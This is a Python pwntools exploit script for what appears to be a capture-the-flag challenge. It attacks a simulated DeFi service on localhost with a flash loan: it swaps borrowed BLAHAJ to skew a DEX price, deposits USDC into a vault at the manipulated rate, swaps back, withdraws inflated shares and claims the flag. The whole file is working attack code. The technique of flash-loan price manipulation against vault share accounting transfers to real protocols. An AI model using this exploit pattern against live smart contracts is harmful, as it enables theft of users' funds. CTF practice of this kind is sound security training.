# exploit.py
from pwn import *
import json

# --- Connection Details ---
HOST = 'localhost'
PORT = 1337

# --- Constants ---
DECIMALS = 10**18

def send_tx(p, tx_data):
    """
    Helper function to send a transaction and get the full JSON response.
    It reads until a newline character, which the server sends to delimit messages.
    """
    # Ensure the process is still alive before sending
    if not p.connected():
        log.error("Connection lost.")
        return None

    p.sendlineafter(b'>', json.dumps(tx_data).encode())
    
    # Use recvline() to read the entire JSON string until the newline delimiter
    try:
        response_bytes = p.recvline().strip()
        if not response_bytes:
            log.warning("Received an empty response from the server.")
            return None
        return json.loads(response_bytes)
    except (EOFError, ConnectionResetError):
        log.error("Connection closed by the server while waiting for a response.")
        return None
    except json.JSONDecodeError as e:
        log.error(f"Failed to decode JSON from server: {e}")
        log.info(f"Received raw data: {response_bytes}")
        return None


def main():
    # Use context.log_level to see detailed pwntools communication
    context.log_level = 'info'
    p = remote(HOST, PORT)

    log.info("--- Starting Exploit ---")

    # --- Step 1: Craft the Flash Loan Exploit ---
    log.info("Crafting the flash loan payload...")
    
    # These values are based on the server's known initial state.
    max_flash_loan = 1000000 * DECIMALS
    optimal_usdc_deposit = 1000 * DECIMALS
    
    initial_dex_usdc = 10000 * DECIMALS
    initial_dex_blahaj = 10000 * DECIMALS
    k = initial_dex_usdc * initial_dex_blahaj
    usdc_out_from_swap = initial_dex_usdc - (k // (initial_dex_blahaj + max_flash_loan))

    flash_loan_payload = [
        {"address": "0x3a8e9A27AbC7cb3F71691c1B5bf216e72A5D0283", "function": "swap", "args": ["BLAHAJ", "USDC", max_flash_loan]},
        {"address": "0x098Ea798EaE10179E5505870095d5a49Db155Fb0", "function": "deposit_usdc", "args": [optimal_usdc_deposit]},
        {"address": "0x3a8e9A27AbC7cb3F71691c1B5bf216e72A5D0283", "function": "swap", "args": ["USDC", "BLAHAJ", usdc_out_from_swap]}
    ]

    exploit_tx = {
        "user": "0x38Dc745781c2C5a16a5d1870876ABFbD1Cec5ac2",
        "calls": [
            {
                "address": "0x098Ea798EaE10179E5505870095d5a49Db155Fb0",
                "function": "execute_atomic_batch",
                "args": [
                    max_flash_loan,
                    flash_loan_payload
                ]
            }
        ]
    }
    
    log.success("Flash loan transaction crafted.")
    log.info("Sending exploit transaction...")
    response = send_tx(p, exploit_tx)
    log.info(f"Server response:\n{json.dumps(response, indent=2)}")

    log.info("Crafting withdrawal transaction...")
    
    shares_to_withdraw = 1001000 * DECIMALS 
    withdraw_tx = {
        "user": "0x38Dc745781c2C5a16a5d1870876ABFbD1Cec5ac2",
        "calls": [
            {
                "address": "0x098Ea798EaE10179E5505870095d5a49Db155Fb0",
                "function": "withdraw_usdc",
                "args": [shares_to_withdraw]
            }
        ]
    }
    log.info("Sending withdrawal transaction...")
    response = send_tx(p, withdraw_tx)
    log.info(f"Withdrawal response:\n{json.dumps(response, indent=2)}")

    log.info("Attempting to claim the flag...")
    get_flag_tx = {
        "user": "0x38Dc745781c2C5a16a5d1870876ABFbD1Cec5ac2",
        "calls": [
            {
                "function": "getFlag"
            }
        ]
    }
    response = send_tx(p, get_flag_tx)
    
    if response and response.get("results"):
        flag_result = response["results"][0]
        flag = flag_result.get("flag")
        if flag:
            log.success(f"FLAG: {flag}")
        else:
            log.failure(f"Failed to get flag. Server says: {flag_result.get('error', 'Unknown error')}")
    else:
        log.failure(f"Failed to get a valid response for getFlag call. Full response:\n{json.dumps(response, indent=2)}")


    p.close()

if __name__ == "__main__":
    main()